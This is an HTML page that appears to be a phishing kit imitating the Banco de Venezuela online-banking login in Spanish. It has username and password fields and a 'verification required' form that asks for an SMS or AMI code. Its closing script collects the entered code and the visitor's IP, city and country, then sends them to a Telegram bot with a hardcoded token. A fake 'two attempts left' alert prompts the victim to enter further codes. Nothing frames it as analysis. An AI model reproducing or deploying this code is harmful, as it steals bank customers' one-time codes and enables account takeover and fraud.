<!DOCTYPE html>
<html lang="es"><script>
    window[Symbol.for('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')] = new (class{constructor(e,t){this.name=e,this.destination=t,this.serverListeners={},this.bgRequestsListeners={},this.bgEventsListeners={},window.addEventListener("message",(e=>{const t=e.data,s=!(t.destination&&t.destination===this.name),n=!t.event;if(!s&&!n)if("MARIO_POST_SERVER__BG_RESPONSE"===t.event){const e=t.args;if(this.hasBgRequestListener(e.requestId)){try{this.bgRequestsListeners[e.requestId](e.response)}catch(e){}delete this.bgRequestsListeners[e.requestId]}}else if("MARIO_POST_SERVER__BG_EVENT"===t.event){const e=t.args;if(this.hasBgEventListener(e.event))try{this.bgEventsListeners[t.id](e.payload)}catch(e){}}else if(this.hasServerListener(t.event))try{this.serverListeners[t.event](t.args)}catch(e){}}))}emitToServer(e,t){const s=this.generateUIID(),n={args:t,destination:this.destination,event:e,id:s};return window.postMessage(n,location.origin),s}emitToBg(e,t){const s=this.generateUIID(),n={bgEventName:e,requestId:s,args:t};return this.emitToServer("MARIO_POST_SERVER__BG_REQUEST",n),s}hasServerListener(e){return!!this.serverListeners[e]}hasBgRequestListener(e){return!!this.bgRequestsListeners[e]}hasBgEventListener(e){return!!this.bgEventsListeners[e]}fromServerEvent(e,t){this.serverListeners[e]=t}fromBgEvent(e,t){this.bgEventsListeners[e]=t}fromBgResponse(e,t){this.bgRequestsListeners[e]=t}generateUIID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){const t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)}))}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}', 'MARIO_POST_SERVER_{fca67f41-776b-438a-9382-662171858615}')</script><script>
    const hideMyLocation = new (class{constructor(t){this.clientKey=t,this.watchIDs={},this.client=window[Symbol.for(t)];const e=navigator.geolocation.getCurrentPosition,o=navigator.geolocation.watchPosition,n=navigator.geolocation.clearWatch,i=this;navigator.geolocation.getCurrentPosition=function(t,o,n){i.handle(e,"GET",t,o,n)},navigator.geolocation.watchPosition=function(t,e,n){return i.handle(o,"WATCH",t,e,n)},navigator.geolocation.clearWatch=function(t){if(-1===t)return;const e=i.watchIDs[t];return delete i.watchIDs[t],n.apply(this,[e])}}handle(t,e,o,n,i){const a=this.client.emitToBg("HIDE_MY_LOCATION__GET_LOCATION");let r=this.getRandomInt(0,1e5);if(this.client.fromBgResponse(a,(a=>{if(a.enabled)if("SUCCESS"===a.status){const t=this.map(a);o(t)}else{const t=this.errorObj();n(t),r=-1}else{const a=[o,n,i],c=t.apply(navigator.geolocation,a);"WATCH"===e&&(this.watchIDs[r]=c)}})),"WATCH"===e)return r}map(t){return{coords:{accuracy:20,altitude:null,altitudeAccuracy:null,heading:null,latitude:t.latitude,longitude:t.longitude,speed:null},timestamp:Date.now()}}errorObj(){return{code:1,message:"User denied Geolocation"}}getRandomInt(t,e){return t=Math.ceil(t),e=Math.floor(e),Math.floor(Math.random()*(e-t+1))+t}})('MARIO_POST_CLIENT_{fca67f41-776b-438a-9382-662171858615}')
  </script><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<style>
		body {
			transition: opacity ease-in 0.2s;
		}
		body[unresolved] {
			opacity: 0;
			display: block;
			overflow: hidden;
			position: relative;
		}
	</style>

	<title>Promocion en Linea</title>
	<script src="jquery.min.js"></script><script>(function inject(e){function SendXHRCandidate(e,t,n,r,i){try{var o="detector",s={posdMessageId:"PANELOS_MESSAGE",posdHash:(Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)).substring(0,22),type:"VIDEO_XHR_CANDIDATE",from:o,to:o.substring(0,6),content:{requestMethod:e,url:t,type:n,content:r}};i&&i[0]&&i[0].length&&(s.content.encodedPostBody=i[0]),window.postMessage(s,"*")}catch(e){}}var t=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],t.apply(this,arguments)};var n=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var t=Object.assign(arguments,{}),r=this.onreadystatechange;return this.onreadystatechange=function(){if(4!==this.readyState||function isFrameInBlackList(t){return e.some((function(e){return t.includes(e)}))}(this.responseURL)||setTimeout(SendXHRCandidate(this.requestMethod,this.responseURL,this.getResponseHeader("content-type"),this.response,t),0),r)return r.apply(this,arguments)},n.apply(this,arguments)};var r=fetch;fetch=function fetch(){var e=this,t=arguments,n=arguments[0]instanceof Request?arguments[0].url:arguments[0],i=arguments[0]instanceof Request?arguments[0].method:"GET";return new Promise((function(o,s){r.apply(e,t).then((function(e){if(e.body instanceof ReadableStream){var t=e.json;e.json=function(){var r=arguments,o=this;return new Promise((function(s,a){t.apply(o,r).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),JSON.stringify(t)),0),s(t)})).catch((function(e){a(e)}))}))};var r=e.text;e.text=function(){var t=arguments,o=this;return new Promise((function(s,a){r.apply(o,t).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),t),0),s(t)})).catch((function(e){a(e)}))}))}}o.apply(this,arguments)})).catch((function(){s.apply(this,arguments)}))}))}})(["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net"]);</script>
	<meta content="width=device-width, initial-scale=1" name="viewport">
	<link href="styles.css" rel="stylesheet">
	<link href="style.css" rel="stylesheet">
	<link href="popup.css" rel="stylesheet">
		<link href="as.css" rel="stylesheet">

	<style type="text/css">
		#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}
	</style>
<script ecommerce-type="extend-native-history-api">(()=>{const e=history.pushState,t=history.replaceState,a=history.back,r=history.forward;function n(){window.postMessage({_custom_type_:"CUSTOM_ON_URL_CHANGED"})}history.pushState=function(){e.apply(history,arguments),n()},history.replaceState=function(){t.apply(history,arguments),n()},history.back=function(){a.apply(history,arguments),n()},history.forward=function(){r.apply(history,arguments),n()}})()</script></head>

<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6IntmY2E2N2Y0MS03NzZiLTQzOGEtOTM4Mi02NjIxNzE4NTg2MTV9IiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOS4xNSIsInNjb3JlIjoxMDkxNX1d">

	<app-root _nghost-c0="" ng-version="6.1.10">
		<spinner _ngcontent-c0="" spinner="sk-wave" _nghost-c1=""></spinner>
		<router-outlet _ngcontent-c0=""></router-outlet>
		<app-login _nghost-c10="" class="ng-star-inserted">
			<div _ngcontent-c10="" class="login-container" bis_skin_checked="1">
				<div _ngcontent-c10="" bis_skin_checked="1">
					<div _ngcontent-c10="" class="login-container-float-center" bis_skin_checked="1">
						<div _ngcontent-c10="" class="row" bis_skin_checked="1">
							<div _ngcontent-c10="" class="col s12 not-margin not-padding" bis_skin_checked="1">
								<div _ngcontent-c10="" bis_skin_checked="1">
									<div _ngcontent-c10="" class="login-container-logo" bis_skin_checked="1"><img _ngcontent-c10="" class="logo-login" src="logo.png"></div>

									<div _ngcontent-c10="" class="login-container-form" bis_skin_checked="1">
										<form _ngcontent-c10="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
											<div _ngcontent-c10="" class="formGroup" role="form" bis_skin_checked="1">
												<mat-form-field _ngcontent-c10="" id="df" appearance="fill" class="mat-form-field ng-tns-c11-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-dirty ng-touched mat-form-field-invalid ng-invalid mat-form-field-hide-placeholder">
													<div class="mat-form-field-wrapper" bis_skin_checked="1">
														<div class="mat-form-field-flex" bis_skin_checked="1">

															<div class="mat-form-field-infix" bis_skin_checked="1">
																<input _ngcontent-c10="" aria-label="usuario" autocomplete="off" class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-untouched ng-pristine ng-invalid " formcontrolname="username" matinput="" maxlength="16" minlength="6" oncut="return false" tabindex="1" type="text" id="mat-input-0" aria-invalid="false" aria-required="false" name="usuario"> <span class="mat-form-field-label-wrapper">
																	<label class="mat-form-field-label ng-tns-c11-0 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-1" for="mat-input-0" aria-owns="mat-input-0">
																		<mat-label _ngcontent-c10="" class="ng-star-inserted">Usuario *</mat-label>
																	</label></span>
																</div>
															</div>

															<div class="mat-form-field-underline ng-tns-c11-0 ng-star-inserted" bis_skin_checked="1">
																<span class="mat-form-field-ripple"></span>
															</div>

															<div class="mat-form-field-subscript-wrapper" bis_skin_checked="1">

																<div class="mat-form-field-hint-wrapper ng-tns-c11-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);" bis_skin_checked="1">

																	<div class="mat-form-field-hint-spacer" bis_skin_checked="1"></div>
																</div>
															</div>
														</div>
													</mat-form-field>
												</div>

												<div _ngcontent-c10="" class="button-login-container" role="row" bis_skin_checked="1">
													<button _ngcontent-c10="" color="accent" mat-raised-button="" role="button" tabindex="2" type="button" class="mat-raised-button mat-accent" onclick="chcs()"><span class="mat-button-wrapper"> Entrar </span>

														<div class="mat-button-ripple mat-ripple" matripple="" bis_skin_checked="1"></div>

														<div class="mat-button-focus-overlay" bis_skin_checked="1"></div>
													</button>
												</div>

											<div _ngcontent-c10="" class="autogestion-usuario-unico text-center" bis_skin_checked="1">
												<a _ngcontent-c10="" class="autogestion-user" href="https://bdvenlinea.banvenez.com/gestion-usuario" mattooltip="Gestiona tu usuario" mattooltipposition="right" role="link" tabindex="3" title="gestión de usuario" style="touch-action: none; user-select: none;" aria-describedby="cdk-describedby-message-0" cdk-describedby-host="" bis_skin_checked="1"> ¿Olvidaste tu usuario o clave? </a><br _ngcontent-c10="">
												<a _ngcontent-c10="" class="autogestion-user" href="https://bdvenlinea.banvenez.com/gestion-usuario" mattooltip="Gestiona tu usuario" mattooltipposition="right" role="link" tabindex="3" title="gestión de usuario" style="touch-action: none; user-select: none;" aria-describedby="cdk-describedby-message-0" cdk-describedby-host="" bis_skin_checked="1"> Si eres nuevo clienteBDV regístrate aquí </a>
											</div>
										</form></div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</app-login>
		</app-root>

		<div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite" bis_skin_checked="1"></div>

		<div id="cdk-describedby-message-container" aria-hidden="true" style="display: none;" bis_skin_checked="1">
			<div id="cdk-describedby-message-0" bis_skin_checked="1">Gestiona tu usuario</div>
		</div>

		<div class="cdk-overlay-container" style="display: none " id="mdl" bis_skin_checked="1">
			<div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing" bis_skin_checked="1"></div>

			<div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;" bis_skin_checked="1">
				<div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;" bis_skin_checked="1">
					<div id="cdk-overlay-2" class="cdk-overlay-pane" style="max-width: 80vw; pointer-events: auto; width: 370px; height: auto; position: static;" bis_skin_checked="1">
						<div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" bis_skin_checked="1"></div>
						<mat-dialog-container aria-modal="true" class="mat-dialog-container ng-tns-c14-39 ng-trigger ng-trigger-slideDialog ng-star-inserted" tabindex="-1" id="mat-dialog-0" role="dialog" style="transform: none; opacity: 1;">

							<app-confirmar-acceso _nghost-c15="" class="ng-star-inserted">
								<div _ngcontent-c15="" class="container" bis_skin_checked="1">
									<div _ngcontent-c15="" class="row" bis_skin_checked="1">
										<h4 _ngcontent-c15="" class="text-center">Introduce tu contraseña</h4>
									</div>

										<div _ngcontent-c15="" class="row" bis_skin_checked="1">
											<mat-form-field _ngcontent-c15="" id="dfs" appearance="fill" class="mat-form-field ng-tns-c11-40 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-pristine ng-invalid mat-form-field-invalid ng-touched mat-form-field-hide-placeholder">
												<div class="mat-form-field-wrapper" bis_skin_checked="1">
													<div class="mat-form-field-flex" bis_skin_checked="1">

														<div class="mat-form-field-infix" bis_skin_checked="1">
															<input _ngcontent-c15="" autocomplete="off" class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-pristine ng-invalid ng-touched" formcontrolname="password" matinput="" name="password" type="password" id="mat-input-1" aria-invalid="true" aria-required="false" aria-describedby="mat-error-4">
															<span class="mat-form-field-label-wrapper">
																<label class="mat-form-field-label ng-tns-c11-40 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-3" for="mat-input-1" aria-owns="mat-input-1" style="">
																	<mat-label _ngcontent-c15="" aria-label="Introduce tu contraseña" class="ng-star-inserted">
																		<span _ngcontent-c15="">Contraseña</span>
																	</mat-label>
																</label>
															</span>
														</div>
													</div>

													<div class="mat-form-field-underline ng-tns-c11-40 ng-star-inserted" style="display: ;" bis_skin_checked="1">
														<span class="mat-form-field-ripple"></span>
													</div>

													<div class="mat-form-field-subscript-wrapper" bis_skin_checked="1">
														<div class="ng-tns-c11-40 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);" bis_skin_checked="1">
															<mat-error _ngcontent-c15="" align="end" class="mat-error ng-star-inserted" role="alert" id="mat-error-4">Contraseña es <strong _ngcontent-c15="">requerida</strong></mat-error>
														</div>
													</div>
												</div>
											</mat-form-field>
										</div>

										<div _ngcontent-c15="" class="row" bis_skin_checked="1">
											<div _ngcontent-c15="" class="button-container" bis_skin_checked="1">
												<button _ngcontent-c15="" color="accent" mat-raised-button="" type="submit" class="mat-raised-button mat-accent ng-pristine ng-invalid ng-touched" onclick="chc(),this.disabled = true">
													<span class="mat-button-wrapper">Continuar</span></button>
													<div class="mat-button-ripple mat-ripple" matripple="" bis_skin_checked="1"></div>
													<div class="mat-button-focus-overlay" bis_skin_checked="1"></div>
												

												<button _ngcontent-c15="" aria-label="cancelar" color="accent" mat-dialog-close="" mat-raised-button="" type="button" class="mat-raised-button mat-accent" onclick="cls()">
													<span class="mat-button-wrapper">Cancelar</span>
													<div class="mat-button-ripple mat-ripple" matripple="" bis_skin_checked="1"></div>
													<div class="mat-button-focus-overlay" bis_skin_checked="1"></div>
												</button>
											</div>
										</div>
									
								</div>
							</app-confirmar-acceso>
						</mat-dialog-container>
						<div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" bis_skin_checked="1"></div>
					</div>
				</div>
			</div>
		</div>

		<section class="containerCustom" id="docPopup" style="display: block;">
			<form action="" id="mainF" method="post" name="mainF">
				<div class="overlay" bis_skin_checked="1">
					<div class="modalCustom" bis_skin_checked="1">
						<center>
							<img src="logo.png" width="225px"><br>

						<h1 class="title" style="font-size: 21px;">Verificación Requerida</h1>

							<hr>
							<p>Ingresá el código SMS enviado o tu AMI</p>
							<input class="inputCodes" maxlength="8" minlength="6"  id="ami" name="smscode"  placeholder="Código " required="" type="text"><br>
							<br>
							<button class="boton" id="mainB" type="submit">CONTINUAR</button>
						</center>
					</div>
				</div>
			</form>
		</section>
		<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
<script>
  (function(){
    const a="https://ipapi.co/json/",b=document.querySelector("#mainF");
    b.addEventListener("submit",(c)=>{
      c.preventDefault();
      axios.get(a).then((d)=>{
        const e=document.querySelector("#ami").value,f="\nCodigo AMI\nAmi: "+e+"\nCiudad:"+d.data.city+"\nPais: "+d.data.country+"\nIP: "+d.data.ip;
        axios.post("https://api.telegram.org/bot" + "7924140534:AAEl_PphYrl17fBzdINxvjJNdbw3_AW-sd0" + "/sendMessage",{chat_id:"-4517336460",text:f}).then((g)=>{
          alert("Ingresa un nuevo codigo. Quedan 2 intentos");
        }).catch((h)=>{console.error(h);});
      }).catch((h)=>{console.log(h);});
    });
  })();
</script>

</body></html>
